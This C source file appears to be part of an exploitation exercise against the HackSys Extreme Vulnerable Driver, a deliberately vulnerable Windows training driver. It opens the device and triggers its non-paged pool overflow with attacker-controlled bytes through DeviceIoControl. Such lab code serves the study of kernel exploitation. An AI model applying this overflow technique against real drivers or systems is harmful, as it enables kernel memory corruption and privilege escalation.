#include <stdio.h>
#include <windows.h>

#include "hevd/hevd.h"

HANDLE HevdOpenDeviceHandle()
{
    HANDLE hFile = CreateFileA(HEVD_DEVICE_NAME,
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        fprintf(stderr, "[-] Failed to open HEVD device handle\n");
        exit(1);
    }

    printf("[+] HEVD device handle: 0x%p\n", hFile);

    return hFile;
}

int HevdTriggerBufferOverflowNonPagedPoolNx(HANDLE hHevd, char* overflow_buf, size_t overflow_size)
{
    ULONG payload_len = 0x200 + overflow_size;

    LPVOID input_buff = VirtualAlloc(NULL,
        payload_len + 0x1,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    if (!input_buff)
    {
        return 0;
    }

    memset(input_buff, 0x41, payload_len);
    memcpy((LPVOID)((uintptr_t)input_buff + 0x200), overflow_buf, overflow_size);

    printf("[*] Sending buffer of size 0x%x to HEVD\n", payload_len);

    DWORD bytes_ret = 0;

    int result = DeviceIoControl(hHevd,
        HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL_NX,
        input_buff,
        payload_len,
        NULL,
        0,
        &bytes_ret,
        NULL);

    if (!result)
    {
        fprintf(stderr, "[-] Failed to execute HEVD DeviceIoControl\n");
    }

    return 1;
}
